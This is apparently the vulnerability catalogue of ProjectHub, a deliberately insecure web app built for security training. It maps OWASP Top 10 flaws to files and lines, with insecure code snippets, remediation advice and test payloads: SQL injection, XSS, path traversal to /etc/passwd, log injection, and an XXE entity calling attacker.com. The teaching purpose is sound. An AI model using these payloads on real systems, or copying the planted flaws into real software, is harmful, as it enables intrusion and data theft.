# Security Vulnerabilities in ProjectHub

This document lists all intentional security vulnerabilities in ProjectHub for security testing and educational purposes.

**⚠️ WARNING: This application is intentionally designed with security vulnerabilities. DO NOT use in production environments.**

## OWASP Top 10 Vulnerabilities

### A1: Injection

**Location**: Multiple endpoints in `backend/routes/`

**Vulnerabilities**:
- **SQL Injection** in search/filter endpoints:
  - `/api/v1/users` - User search with SQL injection
  - `/api/projects` - Project search with SQL injection
  - `/api/tasks` - Task search with SQL injection
  - `/api/v1/search` - Global search with SQL injection
  - `/api/messages/search` - Message search with SQL injection
- Raw SQL queries with string interpolation
- Command injection risk in file handling (`backend/utils/file_handler.py`)

**Files**:
- `backend/routes/api.py` (lines 28, 65, 101, 122, 277, 284, 291)
- `backend/routes/projects.py` (line 26)
- `backend/routes/tasks.py` (line 29)
- `backend/routes/messages.py` (line 185)
- `backend/utils/file_handler.py` (line 66)

**Example**:
```python
# VULNERABLE: SQL Injection
query = f"SELECT * FROM users WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'"
result = db.session.execute(text(query))
```

**Testing**:
- Search for: `' OR '1'='1`
- Search for: `'; DROP TABLE users; --`
- Search for: `admin'--`

### A2: Broken Authentication

**Location**: `backend/routes/auth.py`, `backend/auth.py`

**Vulnerabilities**:
- **Weak JWT secret**: `"secret_key_12345"` (hardcoded in `backend/config.py`)
- **JWT tokens never expire** (`JWT_EXPIRATION_DELTA = None`)
- **No Multi-Factor Authentication (MFA)**
- **Session fixation** (doesn't regenerate session ID)
- **Password reset without email verification** (`/api/auth/reset-password`)
- **No rate limiting** on login attempts
- **Weak password hashing** (MD5 instead of bcrypt/argon2) - `backend/models.py` line 29
- **Passwords logged in plain text** - `backend/utils/logger.py` line 72
- **Case-insensitive login** (username/email matching) - allows enumeration
- **Token can be passed via query parameter or form data** - `backend/auth.py` lines 52-57
- **No token revocation mechanism**

**Files**:
- `backend/auth.py` (lines 11, 15, 24, 30-37, 39-67, 69-77, 79-102)
- `backend/routes/auth.py` (lines 17, 24-30, 40-41, 49-50, 61-62, 70-72, 79-81, 84-85, 87-88, 115-116, 125-129, 134-135, 137-138, 140-141)
- `backend/config.py` (lines 8, 30-31)
- `backend/models.py` (lines 14-15, 27-29, 31-32)

**Testing**:
- Decode JWT tokens at jwt.io
- Try brute force login attempts (no rate limiting)
- Use expired tokens (they never expire)
- Pass token via query parameter: `?token=...`
- Login with any case: `ADMIN`, `admin`, `Admin` all work

### A3: Sensitive Data Exposure

**Location**: All API endpoints, `backend/models.py`

**Vulnerabilities**:
- **API responses include password hashes** - All user endpoints expose `password_hash`
- **API responses include API keys** - All user endpoints expose `api_key`
- **No encryption for data in transit** (HTTP in dev, no HTTPS enforcement)
- **Environment variables with secrets in code** - `backend/config.py`
- **Database credentials in configuration files** - `backend/config.py` line 11-12
- **Secrets in Terraform outputs** - `infrastructure/`
- **Sensitive data in logs** - `backend/utils/logger.py` lines 47-49, 59-64, 71-72, 78-79
- **JWT secret logged at startup** - `backend/utils/logger.py` line 47

**Files**:
- `backend/models.py` (lines 34-45) - `User.to_dict()` exposes sensitive data
- `backend/routes/api.py` (lines 20-22, 34-37, 42-43, 50-53) - No authentication, exposes all data
- `backend/config.py` (lines 7-22) - Hardcoded secrets
- `backend/utils/logger.py` (lines 47-49, 59-64, 71-72, 78-79)

**Example**:
```python
# VULNERABLE: Exposes sensitive data
def to_dict(self):
    return {
        'password_hash': self.password_hash,  # Should not expose
        'api_key': self.api_key  # Should not expose
    }
```

**Testing**:
- Check API responses: `GET /api/v1/users` - see password hashes and API keys
- Review configuration files for hardcoded secrets
- Check logs for sensitive information

### A4: XML External Entities (XXE)

**Location**: `backend/utils/file_handler.py`, `backend/routes/documents.py`

**Vulnerabilities**:
- **XML file processing without XXE protection** - `backend/utils/file_handler.py` line 78
- Uses `xml.etree.ElementTree` which doesn't disable external entities
- Can read internal files via XXE
- No validation of XML structure before processing

**Files**:
- `backend/utils/file_handler.py` (lines 7, 73-90, 129)
- `backend/routes/documents.py` (line 79)

**Example**:
```python
# VULNERABLE: XXE
tree = ET.parse(file_path)  # No protection against external entities
```

**Testing**:
- Upload XML file with: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- Upload XML file with: `<!ENTITY xxe SYSTEM "http://attacker.com/steal">`

### A5: Broken Access Control

**Location**: All route handlers

**Vulnerabilities**:
- **IDOR (Insecure Direct Object References)** - users can access other users' resources:
  - `/api/v1/users/<id>` - Access any user's data
  - `/api/projects/<id>` - Access any project
  - `/api/tasks/<id>` - Access any task
  - `/api/documents/<id>` - Access any document
  - `/api/messages/<id>` - Access any message
- **Broken RBAC** - non-admins can perform admin actions:
  - Any authenticated user can create users (`/api/v1/users` POST)
  - Any authenticated user can update/delete users (`/api/v1/users/<id>` PUT/DELETE)
  - Users can change their own role to admin
  - Users can delete admin users
- **No authorization checks** on many endpoints
- **Misconfigured file permissions** (public access to private documents)
- **Users can modify projects they don't own**
- **Users can delete tasks they didn't create**
- **No cascade deletion checks** (can delete users with orphaned data)

**Files**:
- `backend/routes/api.py` (lines 18-40, 42-53, 58-105, 107-158, 160-183) - User management endpoints
- `backend/routes/projects.py` (lines 13-37, 39-58, 60-95, 96-128, 133-150) - All project endpoints
- `backend/routes/tasks.py` (lines 14-48, 50-69, 71-119, 121-167, 171-188) - All task endpoints
- `backend/routes/documents.py` (lines 14-32, 34-51, 53-108, 110-138, 142-165) - All document endpoints
- `backend/routes/messages.py` (lines 13-54, 56-78, 80-118, 127-137, 139-193) - All message endpoints

**Example**:
```python
# VULNERABLE: IDOR - no access control check
project = Project.query.get(project_id)
# Should check: project.owner_id == user.id or project.is_public or user.role == 'admin'
```

**Testing**:
- Access other users' tasks: `/api/tasks/1` (try different IDs)
- Modify projects you don't own: `PUT /api/projects/1`
- Download documents you don't have access to: `GET /api/documents/1/download`
- Create admin user: `POST /api/v1/users` with `role: 'admin'`
- Change your role to admin: `PUT /api/v1/users/<your_id>` with `role: 'admin'`

### A6: Security Misconfiguration

**Location**: Multiple files

**Vulnerabilities**:
- **Outdated Flask 1.0.0** with known CVEs
- **Outdated Docker base images** (ubuntu:18.04, alpine:3.8)
- **Outdated PostgreSQL** (10.0)
- **Outdated Node.js** (10)
- **Outdated Nginx** (1.14)
- **Missing security headers** (no CSP, X-Frame-Options, etc.)
- **Debug mode enabled in production** - `backend/app.py` line 75
- **Exposed unnecessary ports**
- **Running containers as root user**
- **CORS allows all origins** - `backend/app.py` lines 23-30
- **No HTTPS enforcement**
- **Session cookies not secure** - `backend/config.py` lines 25-26

**Files**:
- `backend/requirements.txt`
- `docker/Dockerfile`
- `docker/docker-compose.yml`
- `infrastructure/main.tf`
- `backend/app.py` (lines 23-30, 75)
- `backend/config.py` (lines 25-26, 38-39)

**Known CVEs**:
- Flask 1.0.0: CVE-2018-1000656, CVE-2019-1010083
- Werkzeug 0.14.1: Multiple vulnerabilities

### A7: Cross-Site Scripting (XSS)

**Location**: Frontend components, backend routes

**Vulnerabilities**:
- **Stored XSS** in:
  - Comments (`backend/models.py` line 112, `frontend/src/components/TaskList.js`)
  - Messages (`backend/models.py` line 158, `frontend/src/components/MessageCenter.js` line 137)
  - Task descriptions (`backend/models.py` line 78)
  - Project descriptions (`backend/models.py` line 52)
- **Reflected XSS** in:
  - Search results (`backend/routes/messages.py` line 191, `frontend/src/components/Dashboard.js` line 48)
  - Global search (`backend/routes/api.py` line 269)
- **DOM-based XSS** (removed - was in notifications)
- **Use of `dangerouslySetInnerHTML`** without sanitization:
  - `frontend/src/components/MessageCenter.js` (line 137)
  - `frontend/src/components/TaskList.js` (comments)
  - `frontend/src/components/ProjectDetail.js` (task descriptions)
- **No Content Security Policy headers**
- **No input sanitization** on backend before storage

**Files**:
- `frontend/src/components/MessageCenter.js` (line 137)
- `frontend/src/components/TaskList.js` (comments rendering)
- `frontend/src/components/ProjectDetail.js` (task descriptions)
- `frontend/src/components/Dashboard.js` (line 48 - reflected XSS)
- `backend/models.py` (lines 52, 78, 112, 158)
- `backend/routes/api.py` (line 269)
- `backend/routes/messages.py` (line 191)

**Example**:
```javascript
// VULNERABLE: XSS
<div dangerouslySetInnerHTML={{ __html: msg.content }} />
```

**Testing**:
- Add comment: `<script>alert('XSS')</script>`
- Add message: `<img src=x onerror=alert('XSS')>`
- Search for: `<img src=x onerror=alert('XSS')>`

### A8: Insecure Deserialization

**Location**: `backend/utils/file_handler.py`

**Vulnerabilities**:
- **Pickle deserialization** can execute arbitrary code (RCE) - line 97
- **YAML deserialization** with unsafe loader - line 109
- **JSON deserialization** without validation
- No validation of deserialized data structure

**Files**:
- `backend/utils/file_handler.py` (lines 8, 92-100, 102-112, 131, 133)

**Example**:
```python
# VULNERABLE: RCE via pickle
data = pickle.load(f)  # Can execute malicious code
```

**Testing**:
- Upload malicious pickle file with code execution payload
- Upload malicious YAML file with code execution

### A9: Using Components with Known Vulnerabilities

**Location**: `backend/requirements.txt`, `frontend/package.json`, Dockerfiles

**Vulnerabilities**:
- **Flask 1.0.0** (multiple CVEs)
- **React 16.8.6** (outdated)
- **Outdated system packages** in Docker images
- **No dependency scanning**
- **Outdated psycopg2** (PostgreSQL adapter)
- **Outdated SQLAlchemy**

**Files**:
- `backend/requirements.txt`
- `frontend/package.json`
- `docker/Dockerfile`
- `docker/docker-compose.yml`

**Known CVEs**:
- Flask 1.0.0: CVE-2018-1000656, CVE-2019-1010083
- Werkzeug 0.14.1: Multiple vulnerabilities

### A10: Insufficient Logging & Monitoring

**Location**: `backend/utils/logger.py`

**Vulnerabilities**:
- **Log injection vulnerabilities** (unsanitized user input) - lines 35-38, 57-64
- **Sensitive information in logs**:
  - Passwords in plain text (line 72)
  - API keys (line 49)
  - JWT secrets (line 47)
  - Database URLs (line 48)
  - Request data (line 79)
- **No log sanitization**
- **Logs stored insecurely** (world-readable)
- **No security event monitoring**
- **No alerting for suspicious activities**

**Files**:
- `backend/utils/logger.py` (lines 9-10, 35-38, 46-49, 54-64, 66-72, 74-79)
- `backend/routes/auth.py` (lines 49-50, 80-81, 87-88, 140-141)

**Example**:
```python
# VULNERABLE: Log injection, sensitive data
logger.warning(f"Login attempt - Username: {username}, Password: {password}")
```

**Testing**:
- Login with username containing newlines: `user\n[ERROR] Admin login`
- Login with username containing log injection: `user\n[CRITICAL] System compromised`

## Additional Vulnerabilities

### Hardcoded Secrets

**Location**: Multiple files

- `backend/config.py`:
  - JWT secret: `"secret_key_12345"` (line 8)
  - AWS credentials (lines 16-17)
  - Database passwords (lines 11-12)
  - Admin credentials (lines 21-22)
- `docker/Dockerfile`: Environment variables with secrets
- `infrastructure/variables.tf`: AWS credentials, database passwords
- `.github/workflows/ci.yml`: Hardcoded secrets in environment variables
- `backend/database.py`: Hardcoded API key for admin (line 433)

### Insecure File Uploads

**Location**: `backend/routes/documents.py`, `backend/utils/file_handler.py`

**Vulnerabilities**:
- **No file type validation** - allows dangerous file types (php, exe, sh, etc.) - `backend/config.py` line 36
- **Path traversal vulnerabilities** - `backend/utils/file_handler.py` lines 30-38
- **Files stored with world-readable permissions** - line 44
- **No virus scanning**
- **Executable files can be uploaded**
- **No file size limit enforcement** (config exists but not enforced)
- **Original filename used** (path traversal risk) - line 31

**Files**:
- `backend/routes/documents.py` (lines 56-108)
- `backend/utils/file_handler.py` (lines 14-20, 22-59, 61-71)
- `backend/config.py` (line 36)

### Path Traversal

**Location**: `backend/routes/documents.py`

**Vulnerabilities**:
- **File download doesn't validate file path** - can access files outside upload directory
- **Filename not properly sanitized** before use

**Files**:
- `backend/routes/documents.py` (lines 110-138)

**Testing**:
- Download: `/api/documents/1/download?file=../../../etc/passwd`

### Misconfigured Cloud Resources

**Location**: `infrastructure/`

**Vulnerabilities**:
- **S3 bucket with public read access**
- **Excessive IAM permissions** (admin access for all roles)
- **Security groups open to 0.0.0.0/0**
- **RDS database publicly accessible**
- **No encryption at rest for S3**
- **Terraform state file not encrypted**
- **No backup retention** for RDS

**Files**:
- `infrastructure/main.tf`
- `infrastructure/s3.tf`
- `infrastructure/iam.tf`

### CI/CD Vulnerabilities

**Location**: `.github/workflows/ci.yml`

**Vulnerabilities**:
- **Hardcoded secrets** in workflow files
- **Secrets exposed in logs**
- **No secret scanning**
- **Insecure artifact storage**
- **Build args with secrets**

### Missing Security Headers

**Location**: `docker/nginx.conf`, Flask app

**Vulnerabilities**:
- **No Content Security Policy (CSP)**
- **No X-Content-Type-Options**
- **No X-Frame-Options**
- **No X-XSS-Protection**
- **No Strict-Transport-Security**

### Insecure Token Storage

**Location**: `frontend/src/App.js`, `frontend/src/services/api.js`

**Vulnerabilities**:
- **JWT tokens stored in localStorage** (XSS risk) - `frontend/src/App.js` lines 19, 36
- **No token refresh mechanism**
- **Tokens never expire**
- **Token accessible via JavaScript** (XSS can steal)

**Files**:
- `frontend/src/App.js` (lines 18-19, 35-36)
- `frontend/src/services/api.js` (lines 13-14, 43-44)

### No CSRF Protection

**Location**: All API endpoints

**Vulnerabilities**:
- **No CSRF tokens**
- **CORS allows all origins** - `backend/app.py` lines 23-30
- **No SameSite cookie attributes**
- **No origin validation**

**Files**:
- `backend/app.py` (lines 23-30)
- `frontend/src/services/api.js` (line 13)

### Weak Input Validation

**Location**: All endpoints

**Vulnerabilities**:
- **No email validation** - `backend/routes/auth.py` line 29
- **No password strength requirements** - `backend/routes/auth.py` line 28
- **No input length limits**
- **No input format validation**
- **No sanitization before storage**

**Files**:
- `backend/routes/auth.py` (lines 24-30, 74-80, 122-129)
- `backend/routes/api.py` (lines 74-80, 122-129)
- All route handlers

### Information Disclosure

**Location**: Multiple endpoints

**Vulnerabilities**:
- **Error messages reveal system information**
- **Stack traces exposed** in error responses
- **Database structure exposed** in error messages
- **Email enumeration** - password reset reveals if email exists - `backend/routes/auth.py` line 134
- **User enumeration** - registration/login reveals if user exists

**Files**:
- `backend/routes/auth.py` (line 134)
- `backend/app.py` (error handlers)

### Case-Insensitive Authentication

**Location**: `backend/routes/auth.py`

**Vulnerabilities**:
- **Username/email matching is case-insensitive** - allows enumeration and potential confusion
- **Login accepts any case variation** of username/email

**Files**:
- `backend/routes/auth.py` (lines 75-77)

## File-by-File Vulnerability Breakdown

### Backend Files

#### `backend/app.py`
- CORS allows all origins (lines 23-30)
- Debug mode enabled (line 75)

#### `backend/auth.py`
- Weak JWT secret (line 11)
- Tokens never expire (line 15)
- Token can be passed via query/form (lines 52-57)
- Weak token validation (lines 30-37, 39-67)

#### `backend/config.py`
- Hardcoded JWT secret (line 8)
- Hardcoded database credentials (lines 11-12)
- Hardcoded AWS credentials (lines 16-17)
- Hardcoded admin credentials (lines 21-22)
- Session cookies not secure (lines 25-26)
- CORS allows all (line 39)
- Allows dangerous file types (line 36)

#### `backend/models.py`
- MD5 password hashing (lines 14-15, 27-29)
- API keys in plain text (line 19)
- Exposes sensitive data in `to_dict()` (lines 34-45)
- No input sanitization (lines 52, 78, 112, 158)

#### `backend/routes/auth.py`
- No rate limiting (lines 17, 61-62, 70-72)
- Weak validation (lines 24-30, 74-80)
- Logs passwords (lines 49-50, 80-81, 87-88)
- No email verification (lines 125-129)
- Information disclosure (line 134)
- Case-insensitive login (lines 75-77)

#### `backend/routes/api.py`
- No authentication on `/users` GET (lines 18-40)
- SQL injection (lines 28, 65, 101, 122, 277, 284, 291)
- IDOR in all endpoints
- Broken access control (lines 64-65, 113-114, 166-168)
- Can create admin users (line 89)
- Can change roles (lines 124, 148)
- Exposes sensitive data (lines 34-37, 50-53)

#### `backend/routes/projects.py`
- SQL injection (line 26)
- IDOR (lines 42-52, 96-128, 133-150)
- Broken access control (lines 30-32, 51-52)

#### `backend/routes/tasks.py`
- SQL injection (line 29)
- IDOR (lines 50-69, 121-167, 171-188)
- Broken access control (lines 35-36, 62-63)
- No input validation (line 74)

#### `backend/routes/documents.py`
- IDOR (lines 34-51, 110-138, 142-165)
- XXE (line 79)
- Insecure file upload (lines 56-108)
- Path traversal (lines 110-138)
- Broken access control (lines 22-23, 46-47)

#### `backend/routes/messages.py`
- IDOR (lines 13-54, 56-78, 127-137)
- SQL injection (line 185)
- Reflected XSS (line 191)
- Broken access control (lines 19-32, 45-46, 51-52, 121-122)

#### `backend/utils/file_handler.py`
- Path traversal (lines 30-38)
- XXE (lines 73-90, 129)
- Insecure deserialization (lines 92-100, 102-112, 131, 133)
- Command injection risk (line 66)
- Insecure file permissions (line 44)

#### `backend/utils/logger.py`
- Log injection (lines 35-38, 57-64)
- Sensitive data in logs (lines 47-49, 59-64, 71-72, 78-79)
- No log sanitization

#### `backend/database.py`
- Hardcoded API key (line 433)
- Passwords same as usernames (intentional for testing)

### Frontend Files

#### `frontend/src/App.js`
- Token in localStorage (lines 18-19, 35-36)

#### `frontend/src/services/api.js`
- No CSRF protection (line 13)
- Token in localStorage (lines 13-14, 43-44)
- Logs sensitive data (line 28)

#### `frontend/src/components/MessageCenter.js`
- XSS via `dangerouslySetInnerHTML` (line 137)

#### `frontend/src/components/TaskList.js`
- XSS in comments rendering
- XSS in task descriptions

#### `frontend/src/components/ProjectDetail.js`
- XSS in task descriptions

#### `frontend/src/components/Dashboard.js`
- Reflected XSS in search (line 48)

#### `frontend/src/components/UserManagement.js`
- No client-side validation
- Displays sensitive data from API

## Testing Checklist

- [ ] SQL Injection in search endpoints (`/api/v1/users`, `/api/projects`, `/api/tasks`)
- [ ] XSS in comments, messages, task descriptions
- [ ] IDOR by modifying URL parameters
- [ ] Broken authentication (weak JWT, no expiration, case-insensitive)
- [ ] XXE in XML file uploads
- [ ] Path traversal in file downloads
- [ ] Insecure file uploads (executable files)
- [ ] Hardcoded secrets in configuration
- [ ] Sensitive data exposure in API responses
- [ ] Log injection in login attempts
- [ ] Broken access control (modify others' resources, create admin users)
- [ ] Outdated dependencies with known CVEs
- [ ] Token stored in localStorage (XSS risk)
- [ ] No CSRF protection
- [ ] CORS allows all origins

## Remediation Recommendations

For each vulnerability, proper remediation would include:

1. **Injection**: Use parameterized queries, input validation, prepared statements
2. **Authentication**: Strong secrets, token expiration, MFA, rate limiting, case-sensitive matching
3. **Sensitive Data**: Encrypt in transit and at rest, don't expose in responses, sanitize logs
4. **XXE**: Use defusedxml, disable external entities
5. **Access Control**: Proper authorization checks, RBAC, verify ownership
6. **Misconfiguration**: Update dependencies, security headers, least privilege, HTTPS only
7. **XSS**: Input sanitization, CSP, avoid dangerouslySetInnerHTML, output encoding
8. **Deserialization**: Avoid pickle, validate YAML/JSON, use safe loaders
9. **Dependencies**: Regular updates, dependency scanning, automated patching
10. **Logging**: Sanitize logs, don't log sensitive data, use structured logging

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
